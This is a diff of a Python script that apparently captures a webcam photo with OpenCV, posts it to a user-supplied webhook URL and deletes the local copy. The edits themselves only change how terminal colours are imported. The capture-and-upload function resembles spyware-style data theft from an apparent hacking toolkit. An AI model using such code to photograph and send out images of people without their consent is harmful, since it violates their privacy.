@@ -3,10 +3,10 @@ import time
 from colorama import Fore
 import os
 import requests
-
+from code.colors import *
 def webcam():
     os.system("cls")
-    webhook = input(f"""{Fore.MAGENTA}
+    webhook = input(f"""{MAGENTA}
         ██     ██ ██████ █████▄ ▄█████ ▄████▄ ██▄  ▄██   
         ██ ▄█▄ ██ ██▄▄   ██▄▄██ ██     ██▄▄██ ██ ▀▀ ██   
          ▀██▀██▀  ██▄▄▄▄ ██▄▄█▀ ▀█████ ██  ██ ██    ██   
@@ -16,10 +16,10 @@ def webcam():
         cap = cv2.VideoCapture(0)
 
         if not cap.isOpened():
-            print(f"{Fore.BLUE} Pas de cam")
+            print(f"{BLUE} Pas de cam")
             return
         else:
-            print(f"{Fore.GREEN} Prise en photo")
+            print(f"{GREEN} Prise en photo")
 
         ret, frame = cap.read()
 
@@ -32,7 +32,7 @@ def webcam():
                     files={"file": f})
             os.remove(filename)
         else:
-            print(f"{Fore.RED} Probleme")
+            print(f"{RED} Probleme")
 
         cap.release()
     except Exception as e:
